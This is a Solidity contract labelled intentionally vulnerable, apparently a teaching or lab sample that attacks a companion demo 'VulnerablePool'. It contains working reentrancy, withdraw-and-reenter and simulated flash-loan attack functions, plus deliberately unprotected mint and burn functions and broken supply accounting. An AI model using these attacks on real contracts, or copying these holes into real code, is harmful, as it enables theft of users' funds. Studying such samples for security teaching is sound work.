// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title MaliciousToken
 * @notice INTENTIONALLY VULNERABLE - For demonstration purposes only
 *
 * This contract demonstrates:
 * 1. Reentrancy attack via callback
 * 2. Weak access control (mint/burn callable by anyone)
 * 3. State inconsistency with totalSupply
 * 4. How cross-contract vulnerabilities work together
 */
contract MaliciousToken {
    string public name = "Malicious Reward Token";
    string public symbol = "MRT";
    uint8 public decimals = 18;

    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    address public pool;
    bool private attacking;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Mint(address indexed to, uint256 value);
    event Burn(address indexed from, uint256 value);
    event Attack(string message, uint256 iteration);

    constructor() {
        // No initial supply
    }

    function setPool(address _pool) external {
        require(pool == address(0), "Pool already set");
        pool = _pool;
    }

    /**
     * @notice VULNERABLE: No access control!
     * Anyone can mint tokens to any address
     * This allows privilege escalation when called from protected functions
     */
    function mint(address to, uint256 amount) external {
        // VULNERABILITY: No access control - anyone can mint
        balanceOf[to] += amount;

        // VULNERABILITY: totalSupply not updated consistently
        // Sometimes updated, sometimes not
        if (amount > 1000 ether) {
            totalSupply += amount;
        }

        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }

    /**
     * @notice VULNERABLE: No access control on burn
     */
    function burn(address from, uint256 amount) external {
        require(balanceOf[from] >= amount, "Insufficient balance");

        balanceOf[from] -= amount;
        // VULNERABILITY: totalSupply not updated - accounting error

        emit Burn(from, amount);
        emit Transfer(from, address(0), amount);
    }

    /**
     * @notice REENTRANCY ATTACK: Exploits VulnerablePool.deposit()
     * This is called by the pool during deposit, creating a callback opportunity
     */
    function notifyDeposit(address user, uint256 amount) external {
        emit Attack("notifyDeposit called", 0);

        // Launch reentrancy attack on first call
        if (!attacking && address(pool) != address(0)) {
            attacking = true;

            emit Attack("Launching reentrancy attack!", 1);

            // ATTACK: Re-enter the pool's deposit function
            // The pool hasn't updated state yet, so we can deposit again
            // This demonstrates cross-contract reentrancy
            try IVulnerablePool(pool).deposit{value: 0.1 ether}() {
                emit Attack("Reentrancy successful!", 2);
            } catch {
                emit Attack("Reentrancy failed", 2);
            }

            attacking = false;
        }
    }

    /**
     * @notice Transfer tokens
     * VULNERABLE: No checks on recipient
     */
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");

        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;

        emit Transfer(msg.sender, to, amount);
        return true;
    }

    /**
     * @notice Demonstrate privilege escalation exploit
     * Anyone can call this to mint unlimited tokens
     */
    function exploitMint() external {
        // Since mint has no access control, anyone can call it
        mint(msg.sender, 1000000 ether);
        emit Attack("Privilege escalation: minted 1M tokens", 0);
    }

    /**
     * @notice Demonstrate state inconsistency
     */
    function demonstrateInconsistency() external view returns (
        uint256 calculatedSupply,
        uint256 reportedSupply,
        bool consistent
    ) {
        // Calculate actual supply by summing all balances (simplified)
        calculatedSupply = balanceOf[msg.sender]; // Simplified for demo
        reportedSupply = totalSupply;
        consistent = (calculatedSupply == reportedSupply);
    }

    /**
     * @notice Attack function: Exploit the pool's withdraw
     */
    function attackWithdraw() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");

        // Step 1: Deposit to pool
        IVulnerablePool(pool).deposit{value: msg.value}();

        // Step 2: Immediately withdraw (with reentrancy)
        // The notifyDeposit callback will re-enter
        IVulnerablePool(pool).withdraw(msg.value);

        // Step 3: Profit from double-counted deposit
        emit Attack("Attack complete - withdrew more than deposited", 3);
    }

    /**
     * @notice Demonstrate flash loan attack vector
     */
    function flashLoanAttack() external payable {
        require(msg.value >= 10 ether, "Need capital for flash loan simulation");

        // Simulate flash loan by depositing large amount
        IVulnerablePool(pool).deposit{value: msg.value}();

        // Manipulate pool's reward calculation by being majority depositor
        uint256 rewards = IVulnerablePool(pool).calculateRewards(address(this));

        // Claim inflated rewards
        IVulnerablePool(pool).claimRewards();

        // Withdraw original deposit
        IVulnerablePool(pool).withdraw(msg.value);

        emit Attack("Flash loan attack executed", 4);
    }

    receive() external payable {
        // Can receive ETH from pool withdrawals
    }
}

/**
 * @notice Minimal interface for attacking the pool
 */
interface IVulnerablePool {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
    function claimRewards() external;
    function calculateRewards(address user) external view returns (uint256);
    function balances(address user) external view returns (uint256);
}
